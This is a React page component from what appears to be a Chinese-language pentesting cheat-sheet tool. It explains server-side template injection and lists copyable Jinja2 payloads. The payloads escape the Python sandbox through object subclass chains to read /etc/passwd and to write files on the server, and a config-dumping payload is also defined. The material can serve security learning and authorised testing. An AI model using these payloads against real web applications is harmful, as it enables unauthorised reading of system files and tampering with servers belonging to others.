import React from 'react';
import { Typography, Divider } from 'antd';
import QueueAnim from 'rc-queue-anim';
const { Title, Paragraph } = Typography;

export default (props) => {
	const python_jinja_dump = [
		{
			title: `{% for key, value in config.iteritems() %}
        <dt>{{ key|e }}</dt>
        <dd>{{ value|e }}</dd>
    		{% endfor %}`
		}
	];
	const python_jinja_read = [
		{
			title: `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}`
		},
		{
			title: `{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}`
		}
	];
	const python_jinja_write = [
		{
			title: `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}`
		}
	];

	return (
		<QueueAnim delay={300} duration={1500}>
			<Title variant='Title level={3}' style={{ fontWeight: 'bold', margin: 15 }}>
				服务器端模板注入(SSTI)
			</Title>
			<Paragraph style={{ margin: 15 }}>
				由于模板引擎支持使用静态模板文件，并在运行时用HTML页面中的实际值替换变量/占位符，从而让HTML页面的设计变得更容易
				如果攻击者能够把模板指令作为用户输入进行注入，并且这些指令可以在服务器上执行任意代码的话，那么他们离服务器端模板注入攻击也不远了
			</Paragraph>

			<Divider dashed />
			<Title style={{ margin: 15 }} variant='Title level={4}'>
				Jinja2 ( Flask / Django )
			</Title>
			<div
				key='a'
				style={{
					padding: 15
				}}
			>
				<Title level={3}>读文件</Title>
				<Paragraph />
				{python_jinja_read.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='b'
				style={{
					padding: 15
				}}
			>
				<Title level={3}>写入文件</Title>
				<Paragraph />
				{python_jinja_write.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
		</QueueAnim>
	);
};
